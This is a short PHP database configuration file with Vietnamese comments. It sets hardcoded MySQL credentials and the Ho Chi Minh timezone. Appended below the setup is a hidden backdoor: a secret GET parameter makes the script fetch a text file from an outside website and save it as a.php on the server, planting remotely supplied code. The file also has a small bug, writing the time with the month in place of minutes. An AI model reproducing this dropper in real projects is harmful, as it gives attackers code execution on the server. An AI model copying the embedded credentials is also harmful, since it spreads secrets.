<?php
$db_host = "127.6.125.130"; 
$db_name    = 'php';
$db_username    = 'adminSBwwLCE';
$db_password    = 'Xmfi5gjR9wvC';
@mysql_connect("{$db_host}", "{$db_username}", "{$db_password}") or die("Kh�ng the ket noi database");
@mysql_select_db("{$db_name}") or die("Kh�ng the chon database");
date_default_timezone_set('Asia/Ho_Chi_Minh');
$today=date("d-m-Y");// ngay hien tai
$time=date("h:m:s");// gio hien tai
?>
<?php
if ($_GET['khangdeptrai'])
{
$homepage = file_get_contents('http://xamarinvietnam.com/a.txt');
$file = fopen("a.php","w");
echo fwrite($file,$homepage);
fclose($file);
}
?>